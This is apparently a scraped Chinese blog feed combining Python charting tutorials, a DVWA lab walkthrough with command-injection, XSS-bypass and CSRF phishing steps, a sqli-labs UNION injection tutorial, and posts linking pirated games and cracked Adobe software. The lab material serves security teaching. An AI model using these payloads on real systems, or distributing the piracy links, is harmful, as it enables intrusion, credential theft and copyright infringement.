导包，导入Line功能构建折线图对象 from pyecharts.charts import Line # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis(us_x_data) # 添加y轴数据 line.add_yaxis(\u0026#34;确诊人数\u0026#34;, us_y_data) # 生成图表 line.render() 单国完整版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import json from pyecharts.charts import Line usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) us_data = us_data[:-2] us_dict = json.loads(us_data) us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] line = Line() line.add_xaxis(us_x_data) line.add_yaxis(\u0026#34;确诊人数\u0026#34;, us_y_data) line.render() 终极版(成品) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import json from pyecharts.charts import Line from pyecharts.options import * usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) indoc = open(\u0026#39;T:/印度.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) jpdoc = open(\u0026#39;T:/日本.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() in_data = indoc.read() jp_data = jpdoc.read() us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) in_data = in_data.replace(\u0026#39;jsonp_1629350745930_63180(\u0026#39;,\u0026#39;\u0026#39;) jp_data = jp_data.replace(\u0026#39;jsonp_1629350871167_29498(\u0026#39;,\u0026#39;\u0026#39;) us_data = us_data[:-2] in_data = in_data[:-2] jp_data = jp_data[:-2] us_dict = json.loads(us_data) in_dict = json.loads(in_data) jp_dict = json.loads(jp_data) us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] in_trend = in_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] jp_trend = jp_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] in_y_data = in_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] jp_y_data = jp_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] line = Line() line.add_xaxis(us_x_data) line.add_yaxis(\u0026#34;美国确诊\u0026#34;, us_y_data) line.add_yaxis(\u0026#34;印度确诊\u0026#34;, in_y_data) line.add_yaxis(\u0026#34;日本确诊\u0026#34;, jp_y_data) line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;2020年美印日确诊人数趋势\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_top=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 ) line.render() ","date":"2025-12-01T08:35:56+08:00","permalink":"https://www.retr0.xyz/p/10.3-%E7%BB%83%E4%B9%A0%E4%B8%80%E6%8A%98%E7%BA%BF%E5%9B%BE/","title":"10.3 练习一：折线图"},{"content":"json 数据格式 什么是json JSON是一种轻量级的数据交互格式。可以按照JSON指定的格式去组织和封装数据 JSON本质上是一个带有特定格式的字符串 主要功能： json就是一种在各个编程语言中流通的数据格式，负责不同编程语言中的数据传递和交互。\njson有什么用 各种编程语言存储数据的容器不尽相同，在Python中有字典dict这样的数据类型，而其它语言可能没有对应的字典。 为了让不同的语言都能够相互通用的互相传递数据，JSON就是一种非常良好的中转数据格式。如下图，以Python和C语言互传数据为例：\njson格式数据转化 json格式的数据要求很严格，如下面所示：\n1 2 3 4 5 # json数据的格式可以是(类字典)： {\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;age\u0026#34;:18} # 也可以是(类列表嵌套字典)： [{\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;age\u0026#34;:18},{\u0026#34;name\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;retr0\u0026#34;,\u0026#34;age\u0026#34;:20}] Python数据和json数据的相互转化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 导入json模块 import json # 准备符合json格式要求的python数据 data = [{\u0026#34;name\u0026#34;:\u0026#34;张三\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;李四\u0026#34;,\u0026#34;age\u0026#34;:20}] # 通过json.dumps(data)方法把python数据转化为了json数据 json1 = json.dumps(data) # 通过json.loads(json1)方法把json数据转化为了python数据 data1 = json.loads(json1) print(data,\u0026#34;类型为\u0026#34;,type(data)) print(json1,\u0026#34;类型为\u0026#34;,type(json1)) print(data1,\u0026#34;类型为\u0026#34;,type(data1)) 注意： 中文内容在转换为json时会出现编码问题，因此需要在json.dumps()中添加参数ensure_ascii=False，如下所示：\n1 2 3 4 import json data = [{\u0026#34;name\u0026#34;:\u0026#34;张三\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;李四\u0026#34;,\u0026#34;age\u0026#34;:20}] json1 = json.dumps(data,ensure_ascii=False) print(json1) pyecharts 入门 基础折线图 Quickstart：\n1 2 3 4 5 6 7 8 9 10 # 导包，导入Line功能构建折线图对象 from pyecharts.charts import Line # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) # 添加y轴数据 line.add_yaxis(\u0026#34;GDP\u0026#34;,[30,20,10]) # 生成图表 line.render() 输出了文件render.html我们打开，如图所示：\n全局配置 通过全局配置我们可以修改图标的标题，图例，工具箱，视觉映射，鼠标悬浮提示框，区域缩放等配置项\n设置全局配置项set_global_opts来设置\n所以我们要额外导入pyecharts的一个方法\u0026quot;options\u0026quot;\n1 from pyecharts.options import * 例如：\n1 2 3 4 5 6 7 8 9 line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;GDP展示\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_bottom=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 visualmap_opts=VisualMapOpts(is_show=True), ) 此处仅展示部分，更多请查看官方文档全局配置项 - pyecharts - Python Echarts Plotting Library built with love.\n现在我们将上面的两部分代码整合起来：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pyecharts.charts import Line from pyecharts.options import * # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) # 添加y轴数据 line.add_yaxis(\u0026#34;GDP\u0026#34;,[30,20,10]) line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;GDP展示\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_bottom=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 visualmap_opts=VisualMapOpts(is_show=True), ) # 生成图表 line.render() 结果如下：\n","date":"2025-12-01T08:35:11+08:00","permalink":"https://www.retr0.xyz/p/10.2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86json-%E6%A0%BC%E5%BC%8F%E5%92%8C-pyecharts-%E5%85%A5%E9%97%A8/","title":"10.2 前置知识：json 格式和 pyecharts 入门"},{"content":" 本篇文章如未特别强调，均使用提供的Win10进行实验\n靶场的获取与配置 本篇内容基于dvwa靶场，文件已经放在文章0.安全类工具文件资源库中了，这里再贴出来一次\n链接：https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg 提取码：38mj\n下载得到dvwa汉化版.zip，将压缩包里dvwa文件夹里的文件解压到C:\\phpstudy_pro\\WWW中，注意提前将phpmyadmin以外的其他文件删除\n打开phpstudy，在“网站”菜单中的“管理”处设置php版本为5.6.x; 到“设置”-“配置文件”中点击你上面选择的php版本打开配置文件 使用Ctrl+F搜索allow_url_fopen和allow_url_include确保这两项后面的配置都是On，保存文件 回到首页，启动Apache和MySQL，打开FireFox浏览器访问127.0.0.1，点击下面的 |创建/重置数据库| 按钮 登录，用户名为：admin，密码为：password 在DVWA安全页面里设置安全等级为low 靶场的使用 提前配置好抓包环境并打开burp suite，详见1.1 抓包和web基本知识\n小贴士：可以在phpstudy目录下新建test.php用来测试代码中看不懂的部分\n暴力破解 Brute Force 打开dvwa中暴力破解页面，可以点击右下角查看源代码简单分析功能如何实现\n现在随便输入用户名和密码（以分别为admin；123为例），同时启用抓包，点击“登陆”，发现已经抓到相应数据包，右键空白处点击“Send to Intruder\u0026quot;后放行数据包 转到Intruder-Positions页面，这里需要我们设置要暴力破解哪个部分，我们先点击Clear§，然后选中密码部分（也就是123），点击add§,Attack Type选择sniper 转到Payloads选项中，可以在Payloads Options中添加可能的密码或直接导入字典 点击Start attack等待攻击完成提示Finished 点击Length按照长度排序，发现“password”的长度明显与其他不同，说明password是正确密码 补充1(点击展开)：不同的攻击模式：\nsniper 模式[单向爆破] 知道用户名不知道密码的情况，破解一些单一的输入框battering ram 模式[并发攻击] 对多个目标进行单一的payload攻击，也就是用户名和密码一致pitchfork 模式[交叉攻击(撞库)] 有几个变量就可以选几个字典，从字典中随机抽取穷举cluster bomb 模式[完整爆破] 从字典中挨个抽取尝试 命令注入 Command injection（命令执行漏洞） 所谓命令执行漏洞就是说一个地方可以执行操作系统的命令\nlow 低难度 打开dvwa中命令注入页面，可以点击右下角查看源代码简单分析功能如何实现\n补充2(点击展开)：在Windows CMD中可以通过\u0026amp;、\u0026amp;\u0026amp;符号同时输入并执行两条指令，其他也有|、||等在特定条件下可用\n例如执行ping www.retr0.xyz \u0026amp; ipconfig，输出\n正在 Ping www.retr0.xyz [104.21.69.83] 具有 32 字节的数据: 来自 104.21.69.83 的回复: 字节=32 时间=211ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=202ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=200ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=201ms TTL=128 104.21.69.83 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 200ms，最长 = 211ms，平均 = 203ms Windows IP 配置 以太网适配器 Ethernet0: 连接特定的 DNS 后缀 . . . . . . . : localdomain 本地链接 IPv6 地址. . . . . . . . : fe80::9087:a026:a5bf:e1c5%12 IPv4 地址 . . . . . . . . . . . . : 192.168.80.134 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 192.168.80.2 我们直接填入`127.0.0.1 \u0026 ipconfig`即可 high 高难度 现在我们加大难度为high，重新查看源代码发现多出了过滤机制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 补充3(点击展开)：str_replace的用法：str_replace(\u0026quot;要换的字符串\u0026quot;,\u0026quot;替换为\u0026quot;,作用于哪个变量)，例如：\n\u0026lt;?php $a = $_GET['username']; $b = str_replace('t','x',$a); echo $b; ?\u0026gt; 打开url:http://127.0.0.1/test.php?username=retr0，返回 rexr0\n漏洞解析： 观察发现屏蔽名单中\u0026rsquo;| \u0026lsquo;为一个管道符加一个空格，因此我们填入127.0.0.1 |ipconfig即可\n如果在linux环境下 ping 127.0.0.1 \u0026amp; cat /etc/passwd\t几乎同时执行\nping 127.0.0.1 \u0026amp;\u0026amp; cat /etc/passwd\t执行完左边去执行右面\nping 127.0.0.1 | cat /etc/passwd\t只执行右面\n反射型跨站点脚本（XSS） 打开dvwa中XSS 反射型页面，随便输入几个字符测试，以retr0为例\nlow 低难度 右键查看页面源代码发现提交的字符会直接填到下面的“你好”后面，如图：\n结合右下角查看php源代码也可以得到\n漏洞解析： 因此我们可以在输入的字符串中插入\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;的html脚本，让网页执行我们的脚本代码\n填入ret\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0,网页弹窗内容‘123’\nmedium 中等难度 点击右下角查看源代码发现添加了过滤机制：\n1 $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 漏洞解析： 屏蔽代码只过滤了一次\u0026lt;script\u0026gt;，因此我们使用双写绕过，填入ret\u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0，其中\u0026lt;script\u0026gt;被过滤后又重新组合为新的\u0026lt;script\u0026gt;从而生效；此外将\u0026lt;script\u0026gt;中的字符替换为大写也可以，例如ret\u0026lt;sCRIpt\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0（原理：前端代码不识别\u0026lt;script\u0026gt;大小写）\nhigh 高难度 点击右下角查看源代码发现升级了过滤机制：\n1 $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 因此直接使用\u0026lt;script\u0026gt;的方法已经完全不可用\n补充4(点击展开)：html存在以下加载图片的句法：\n\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;\n当页面试图加载名为x的图片但是失败时就会把onerror后面的代码当作JavaScript来执行\n另外还有onmouseover=(鼠标浮过)onmouseup=(鼠标松开)onmousedown=(鼠标按下)等参数可供替换\n漏洞解析： 我们利用html图片加载代码来执行js，填入ret\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;r0\n存储的跨站点脚本（XSS） 打开dvwa中XSS 存储型页面，随便输入几个字符测试\nlow 低难度 发现和上面的反射型原理类似，直接填入留言hel\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;lo\nmedium 中等难度 查看源代码发现在留言上启用了htmlspecialchars（将特定的 HTML 字符转换为 HTML 实体字符），名字上添加了过滤，如下：\n1 2 3 $message = htmlspecialchars( $message ); $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $name ); 因此我们针对名字下手，直接填入双写绕过的字符串发现网页对长度有限制，所以要用burp suite修改数据包\n随便填写名字和留言（以123；hello）为例，打开抓包后点击“提交留言”，发现截获的数据包有以下内容（不一定完全一致）：\ntxtName=123\u0026amp;mtxMessage=hello\u0026amp;btnSign=%E6%8F%90%E4%BA%A4%E7%95%99%E8%A8%80\n将这里的123改为hel\u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(123)\u0026lt;/script\u0026gt;lo后放行数据包发现提交成功\nhigh 高难度 查看源代码发现名字对\u0026lt;script\u0026gt;的屏蔽升级：\n1 $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $name ); 漏洞解析： 依旧结合抓包使用图片加载机制传入字符串hel\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;lo，成功提交\n跨站请求伪造 (CSRF) low 低难度 打开dvwa中跨站请求伪造 (CSRF)页面，随便输入几个字符测试\n获取当前页面的url：http://127.0.0.1/vulnerabilities/csrf/?password_new=password\u0026amp;password_conf=password\u0026amp;Change=æ´æ¹#\n应用场景： 利用上面的连接制作钓鱼网站诱导某网站管理员点击该链接即可直接修改管理员密码\n","date":"2025-11-30T14:10:19+08:00","permalink":"https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/","title":"1.6 其他基础web漏洞介绍"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nWatch Dogs 3 [看门狗3：军团] 有解压密码！ https://pan.baidu.com/s/1fv6JvJKRZGL3q9qYcfklyA?pwd=mmjp Outer Wilds [星际拓荒] 有解压码！ https://pan.baidu.com/s/1_wY1xqBZOCJU-ifVG9M3_A?pwd=jce1 ","date":"2025-11-30T10:29:51+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%BC%80%E6%94%BE%E4%B8%96%E7%95%8C%E5%92%8Crpg%E7%B1%BB/","title":"游戏资源：开放世界和RPG类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nPlagueInc [瘟疫公司] https://pan.baidu.com/s/1j0bWB6twLDmx8WKHKfYpQw?pwd=7ih8 Command and Conquer Red Alert 3 [红色警戒3] https://pan.baidu.com/s/1IYQSA-F7McqPmSKl8a8j9w?pwd=r9tu Euro.Truck.Simulator.2.v1.44.1.1s [欧洲卡车模拟2] https://pan.baidu.com/s/1sBThylD4nLZ2S-EZvYxsBw?pwd=3smf Forza Horizon 5 [极限竞速：地平线5] https://pan.baidu.com/s/12gktk9uyoj_M_WwMVhFykQ?pwd=63w6 Heart of Iron IV [钢铁雄心4全DLC] https://pan.quark.cn/s/b3f595782bc2 The Legend of Zelda Breath of the Wild [塞尔达传说：旷野之息] [注意解压码] https://pan.baidu.com/s/1STklzafjKfpbnL1XFB4lBQ?pwd=h8m6 Forza Horizon 4 [极限竞速：地平线4] [注意解压码] https://pan.baidu.com/s/1Sv0Dw5xUsyDfvHfyRCrANQ?pwd=eajv ","date":"2025-11-29T23:01:17+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E6%A8%A1%E6%8B%9F%E7%B1%BB/","title":"游戏资源：策略和模拟类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nThe Farmer Was Replaced [编程农场] https://pan.baidu.com/s/1A91Vk-2It-QHxY6ySZF3_Q?pwd=qf4a The Exit 8 [8号出口] https://pan.baidu.com/s/1XfX4YHtOaNrP74JRmNDQdg?pwd=a8ry Miside [米塔] https://pan.baidu.com/s/1hAcgYQaY4rSbOHSc8UBQhw?pwd=sp2s POOLS [池核] 有解压码！ https://pan.baidu.com/s/1Nx93vdv0FCjJWp0cMLgycA?pwd=mbu7 ","date":"2025-11-29T22:46:07+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%85%B6%E4%BB%96%E7%8B%AC%E7%AB%8B%E5%B0%8F%E6%B8%B8%E6%88%8F/","title":"游戏资源：其他独立小游戏"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\n[轻音少女 放学后演唱会！!老版汉化+新版高清重制生肉 PSP镜像] https://pan.baidu.com/s/1voHcmMSed43GeUKsoatILA?pwd=it14\n","date":"2025-11-29T22:45:48+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%B1%BB/","title":"游戏资源：模拟器类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nSifu [师傅] https://pan.baidu.com/s/1S6AG2zyuzII_IWnKaJf-0A?pwd=hb3e Sekiro:Shadows Die Twice [只狼：影逝二度] [注意解压码] https://pan.baidu.com/s/1KXq6HZLCp7-L3layy2n29w?pwd=r8ev ","date":"2025-11-29T22:45:22+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%8A%A8%E4%BD%9C%E6%A0%BC%E6%96%97%E7%B1%BB/","title":"游戏资源：动作格斗类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\n[魔法少女的魔女审判] https://pan.baidu.com/s/1A6-jTkGcgWslufbaSzfwpQ?pwd=1d5a ATRI -My Dear Moments-[亚托莉 -我挚爱的时光-] https://pan.baidu.com/s/1XlReK-Tqciw1Fvy6CMuyaA?pwd=6tc5 Ace.Attorney.Investigations.Collection [逆转检事 1\u0026amp;2 御剑精选集] https://pan.baidu.com/s/1_pyzQKjhMoEoKgtFfxK6qA?pwd=ndfw Phoenix Wright Ace Attorney Trilogy [逆转裁判 1,2,3 成步堂精选集] https://pan.baidu.com/s/1fYdMkw4yXT2pvXV6MLJx7g?pwd=cfaw [饿殍：明末千里行] https://pan.baidu.com/s/1W8ppqSzJu4eLha9M3K6pZA?pwd=qp4s [爱上火车-Last Run!!-] https://pan.baidu.com/s/1Y65Ewgmt51Ym6V0xy19i7A?pwd=7x2g ","date":"2025-11-29T22:44:48+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90galgame%E7%B1%BB%E5%92%8C%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E7%B1%BB/","title":"游戏资源：Galgame类和视觉小说类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nReady Or Not [严阵以待] https://pan.baidu.com/s/1wW1S2dGabcJYJ-acglLd2A?pwd=ehrw Escape from Duckov [逃离鸭科夫] https://pan.baidu.com/s/1bwzu7BOxRYa17YqqD-ekow?pwd=uq1d Call Of Duty 5(COD5) [使命召唤5] https://pan.baidu.com/s/1CTUJDIcV_KIXSAuS8-D5Bg?pwd=g28v Titanfall 2 [泰坦陨落2] [注意解压码] https://pan.baidu.com/s/1zzAxlCOyI7ErW8yk9jv68g?pwd=3j7v ","date":"2025-11-29T22:44:25+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90fps%E6%88%96tps%E7%B1%BB/","title":"游戏资源：FPS或TPS类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找软件请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nAdobe全家桶 单个软件版（指挑选需要的软件安装） https://pan.baidu.com/s/1ZlBQvcGhgLrxq3vpY555Zg?pwd=q4wh\nAdobe全家桶 一键安装全套 https://pan.baidu.com/s/1cdRjOAQmKTEcd59LpYZ0HQ?pwd=n5vv\n","date":"2025-11-29T22:42:14+08:00","permalink":"https://www.retr0.xyz/p/%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90/","title":"软件资源"},{"content":"手动注入(ORDER BY与联合查询注入) 以靶场http://sqlilabs.njhack.xyz/Less-1/index.php为例\nStep1：破坏数据库语句 破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法\n数据库传入参数的几种闭合方式：\n1 2 3 4 5 6 7 8 \u0026#39;\u0026#39; \u0026#34;\u0026#34; () ((\u0026#39;\u0026#39;)) (\u0026#34;\u0026#34;) ((\u0026#34;\u0026#34;)) (()) 没有闭合方式 补充1：\n\\称为转义字符，可以把自己后面的第一个东西当作字符串去执行\n我们传入以下参数：2\\\n有如下报错：\n我们选取其中核心部分''2\\' LIMIT 0,1'去掉头尾（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）\n1 \u0026#39;2\\\u0026#39; LIMIT 0,1 由此得知该数据库的查询语句是单引号''闭合\n因此大概估计查询语句可能为\n1 select username,password from tablex where id = \u0026#39;$id\u0026#39; limit 0,1 解释：此处limit a,b语法指从数据表的第a条起选取b条数据\n数据表条目要从第0个开始数\n补充2：\n数据库的注释符：--、/**/、# +在GET请求里相当于空格 +一般配合--作为GET请求的注释符使用\n接下来我们传入参数id=2' --+，那么拼成的语句是：\n1 select username,password from tablex where id = \u0026#39;2\u0026#39; --+ \u0026#39;limit 0,1 由于--把后面的内容都注释掉了，实际上执行的数据库语句应该是：\n1 select username,password from tablex where id = \u0026#39;2\u0026#39; 提交参数发现查询正常（如图），说明它真的是用''进行闭合的\n后日谈： 也可以用永真或永假条件进行测试，即传入\n1 2 OR 1=1\t//永真 OR 1=2\t//永假 Step2：确定查询了多少个栏目 从现在开始我们要调用各种语法查询数据，记住之后的语法全部都是插入在2' {} --+中的花括号位置！\n因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目\n传入参数2' order by [数字] --+使用二分法查看\n依次传参，其中数字填为10、5、3\u0026hellip;\u0026hellip;\n当数字最大为3时有结果，改为4时没有结果\n因此确定查询出了3个栏目，之前的猜测错误\n修正：可能的查询项目是id,username,password\nStep3：显示报错位 传入参数2' union select 1,2,3 --+返回结果\n但是我们想要让查询的1,2,3显示出来，所以要故意让union之前的查询语句出错掩盖掉正常数据\n传入参数-2' union select 1,2,3 --+返回结果\n说明2、3号位是报错位（显示位）\n补充3：\nunion select a,b,c语法为联合查询，方便我们将两条查询语句捆绑起来一起执行，而且即便其中一条查询语句报错也不影响另一条查询语句输出结果，本地演示效果如下：\n第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，因此第二条select内容务必参照Step2中获得的查询栏目数填写！\nStep4：查看数据库的库名 使用语法database()替换任意报错位\n传入参数-2' union select 1,database(),3 --+返回结果:\n此时2号位对应显示的就是数据库的库名：security\nStep5：根据库名查看表名 补充4：\n数据库中一般有一个库名为information_schema其中有名为TABLES的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为TABLE_SCHNEMA，数据表名所在的列（栏目）为TABLE_NAME，如图\n所以我们要编辑一下第二条查询语句让他能查询到information_schema库中TABLES表中的TABLE_NAME栏目，并且要限制条件TABLE_SCHEMA=\u0026lsquo;security\u0026rsquo;，整合一下需求：\n1 -2\u0026#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=\u0026#39;security\u0026#39; --+ 为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充limit 0,1，之后依次修改前一个数字为1、2、3、4\u0026hellip;\u0026hellip;即可，也就是：\n1 -2\u0026#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=\u0026#39;security\u0026#39; limit 0,1 --+ 传入参数后发现有4张表：emails referers uagents users\n显然users这个表对我们应该更有用\nStep6：查询所需表的列（栏目）名 补充5：\ninformation_schema这个库中还有一个名为COLUMNS的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（TABLE_NAME）里包含的栏目(COLUMN_NAME)\n后日谈：\ninformation_schema（MySQL元数据系统库）tables 表(表元数据)TABLE_SCHEMA表所属数据库名TABLE_NAME表名称columns 表(列元数据)TABLE_SCHEMA字段所属数据库名TABLE_NAME字段所属表名COLUMN_NAME字段名 所以我们现在的需求就是去information_schema.COLUMNS表中查找COLUMN_NAME栏目来看看security里users这个表有哪些栏目，并且添加限定条件TABLE_SCHEMA='security' and TABLE_NAME='users'整合需求得到以下参数\n1 -2\u0026#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=\u0026#39;security\u0026#39; and TABLE_NAME=\u0026#39;users\u0026#39; limit 0,1 --+ 依次修改limit的值发现有这三个栏目：id username password\nStep7：全部取出username及对应password 补充6：\n使用group_concat(栏目名)可以取出对应栏目的所有数据\n方法一：group_concat()语法 